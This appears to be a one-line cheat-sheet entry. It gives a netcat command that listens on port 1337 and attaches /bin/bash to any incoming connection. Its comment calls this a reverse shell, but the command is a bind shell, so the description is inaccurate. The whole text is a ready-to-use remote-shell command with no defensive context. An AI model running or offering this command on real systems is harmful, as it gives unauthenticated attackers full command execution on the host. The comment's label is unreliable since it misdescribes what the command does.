# Create a bash process and connect its stdin/out to a network pipe using netcat (reverse shell)
nc -l -p 1337 -e /bin/bash
